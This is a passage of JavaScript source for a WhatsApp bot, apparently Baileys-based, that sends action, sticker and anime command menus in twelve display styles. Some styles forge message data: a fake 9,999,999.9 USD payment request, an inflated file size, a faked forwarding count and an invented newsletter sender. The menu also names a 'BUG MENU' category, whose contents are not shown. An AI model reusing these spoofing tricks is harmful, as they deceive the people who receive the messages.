│${setv} ${prefix}*rate√*
│${setv} ${prefix}*cry√*
│${setv} ${prefix}*kill√*
│${setv} ${prefix}*hug√*
│${setv} ${prefix}*pat√*
│${setv} ${prefix}*lick√*
│${setv} ${prefix}*kiss√*
│${setv} ${prefix}*bite√*
│${setv} ${prefix}*yeet√*
│${setv} ${prefix}*bully√*
│${setv} ${prefix}*bonk√*
│${setv} ${prefix}*wink√*
│${setv} ${prefix}*poke√*
│${setv} ${prefix}*nom√*
│${setv} ${prefix}*slap√*
│${setv} ${prefix}*smile√*
│${setv} ${prefix}*wave√*
│${setv} ${prefix}*awoo√*
│${setv} ${prefix}*blush√*
│${setv} ${prefix}*smug√*
│${setv} ${prefix}*glomp√*
│${setv} ${prefix}*happy√*
│${setv} ${prefix}*dance√*
│${setv} ${prefix}*cringe√*
│${setv} ${prefix}*cuddle√*
│${setv} ${prefix}*highfive√*
│${setv} ${prefix}*handhold√*
│${setv} ${prefix}*spank√*
│${setv} ${prefix}*tickle√*
│${setv} ${prefix}*feed√*
│${setv} ${prefix}*checkme√*
│${setv} ${prefix}*sound1 - sound161√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/oCtkhtP.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/oCtkhtP.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'stickermenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Sticker* 」❍
│${setv} ${prefix}*goose√*
│${setv} ${prefix}*woof√*
│${setv} ${prefix}*8ball√*
│${setv} ${prefix}*lizard√*
│${setv} ${prefix}*meow√*
│${setv} ${prefix}*gura√*
│${setv} ${prefix}*telestick√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/rM74vTU.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/rM74vTU.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'animemenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Anime* 」❍
│${setv} ${prefix}*searchamime√*
│${setv} ${prefix}*animeinfo (to get anime id)√*
│${setv} ${prefix}*animedl (downlaod anime by id)√*
│${setv} ${prefix}*searchmanga√*
│${setv} ${prefix}*stickhandhold√*
│${setv} ${prefix}*stickshinobu√*
│${setv} ${prefix}*stickcuddle√*
│${setv} ${prefix}*stickhighfive√*
│${setv} ${prefix}*stickdance√*
│${setv} ${prefix}*stickcringe√*
│${setv} ${prefix}*stickhappy√*
│${setv} ${prefix}*stickglomp√*
│${setv} ${prefix}*sticksmug√*
│${setv} ${prefix}*stickblush√*
│${setv} ${prefix}*stickawoo√*
│${setv} ${prefix}*stickwave√*
│${setv} ${prefix}*sticksmile√*
│${setv} ${prefix}*stickslap√*
│${setv} ${prefix}*stickpoke√*
│${setv} ${prefix}*stickwink√*
│${setv} ${prefix}*stickbonk√*
│${setv} ${prefix}*stickbully√*
│${setv} ${prefix}*stickyeet√*
│${setv} ${prefix}*stickbike√*
│${setv} ${prefix}*stickkiss√*
│${setv} ${prefix}*sticklick√*
│${setv} ${prefix}*stickpat√*
│${setv} ${prefix}*stickhug√*
│${setv} ${prefix}*stickkill√*
│${setv} ${prefix}*stickcry√*
│${setv} ${prefix}*stickspank√*
│${setv} ${prefix}*sticktickle√*
│${setv} ${prefix}*traceanime√*
│${setv} ${prefix}*akira√*
│${setv} ${prefix}*akiyama√*
│${setv} ${prefix}*ana√*
│${setv} ${prefix}*asuna√*
│${setv} ${prefix}*ayuzawa√*
│${setv} ${prefix}*boruto√*
│${setv} ${prefix}*chiho√*
│${setv} ${prefix}*chitoge√*
│${setv} ${prefix}*cosplayloli√*
│${setv} ${prefix}*cosplaysagiri√*
│${setv} ${prefix}*deidara√*
│${setv} ${prefix}*doraemon√*
│${setv} ${prefix}*elaina√*
│${setv} ${prefix}*emilia√*
│${setv} ${prefix}*erza√*
│${setv} ${prefix}*gremory√*
│${setv} ${prefix}*hestia√*
│${setv} ${prefix}*husbu√*
│${setv} ${prefix}*inori√*
│${setv} ${prefix}*isuzu√*
│${setv} ${prefix}*itachi√*
│${setv} ${prefix}*itori√*
│${setv} ${prefix}*kaga√*
│${setv} ${prefix}*kagura√*
│${setv} ${prefix}*kakasih√*
│${setv} ${prefix}*kaori√*
│${setv} ${prefix}*keneki√*
│${setv} ${prefix}*kotori√*
│${setv} ${prefix}*kurumi√*
│${setv} ${prefix}*loli√*
│${setv} ${prefix}*loli2√*
│${setv} ${prefix}*madara√*
│${setv} ${prefix}*megumin√*
│${setv} ${prefix}*mikasa√*
│${setv} ${prefix}*mikey√*
│${setv} ${prefix}*miku√*
│${setv} ${prefix}*minato√*
│${setv} ${prefix}*naruto√*
│${setv} ${prefix}*neko√*
│${setv} ${prefix}*nekonime√*
│${setv} ${prefix}*nezuko√*
│${setv} ${prefix}*onepiece√*
│${setv} ${prefix}*pokemon√*
│${setv} ${prefix}*randomnime√*
│${setv} ${prefix}*randomnime2√*
│${setv} ${prefix}*rize√*
│${setv} ${prefix}*sagiri√*
│${setv} ${prefix}*sakura√*
│${setv} ${prefix}*sasuke√*
│${setv} ${prefix}*shina√*
│${setv} ${prefix}*shinka√*
│${setv} ${prefix}*shinomiya√*
│${setv} ${prefix}*shizuka√*
│${setv} ${prefix}*shota√*
│${setv} ${prefix}*tejina√*
│${setv} ${prefix}*toukachan√*
│${setv} ${prefix}*tsunade√*
│${setv} ${prefix}*waifu√*
│${setv} ${prefix}*waifu2√*
│${setv} ${prefix}*animewall√*
│${setv} ${prefix}*yotsuba√*
│${setv} ${prefix}*yuki√*
│${setv} ${prefix}*yulibocil√*
│${setv} ${prefix}*yumeko√*
│${setv} ${prefix}*8ball√*
│${setv} ${prefix}*animeawoo√*
│${setv} ${prefix}*animemegumin√*
│${setv} ${prefix}*animeshinobu√*
│${setv} ${prefix}*animehandhold√*
│${setv} ${prefix}*animehighfive√*
│${setv} ${prefix}*animecringe√*
│${setv} ${prefix}*animedance√*
│${setv} ${prefix}*animehappy√*
│${setv} ${prefix}*animeglomp√*
│${setv} ${prefix}*animeblush√*
│${setv} ${prefix}*animesmug√*
│${setv} ${prefix}*animewave√*
│${setv} ${prefix}*animesmille√*
│${setv} ${prefix}*animepoke√*
│${setv} ${prefix}*animewink√*
│${setv} ${prefix}*animebonk√*
│${setv} ${prefix}*animebully√*
│${setv} ${prefix}*animeyeet√*
│${setv} ${prefix}*animebite√*
│${setv} ${prefix}*animelick√*
│${setv} ${prefix}*animekill√*
│${setv} ${prefix}*animecry√*
│${setv} ${prefix}*animewlp√*
│${setv} ${prefix}*animekiss√*
│${setv} ${prefix}*animehug√*
│${setv} ${prefix}*animeneko√*
│${setv} ${prefix}*animepat√*
│${setv} ${prefix}*animeslap√*
│${setv} ${prefix}*animecuddle√*
│${setv} ${prefix}*animewaifu√*
│${setv} ${prefix}*animenom√*
│${setv} ${prefix}*animefoxgirl√*
│${setv} ${prefix}*animegecg√*
│${setv} ${prefix}*animetickle√*
│${setv} ${prefix}*animefeed√*
│${setv} ${prefix}*animeavatar√*
│${setv} ${prefix}*anime√*
│${setv} ${prefix}*avatar√*
│${setv} ${prefix}*shinobu√*
│${setv} ${prefix}*fox_girl√*
│${setv} ${prefix}*gecg√*
│${setv} ${prefix}*sendanimeid√*
│${setv} ${prefix}*animedl√*
│${setv} ${prefix}*mangaimg√*
│${setv} ${prefix}*animeimg√*
│${setv} ${prefix}*animeinfo√*
│${setv} ${prefix}*searchmanga√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
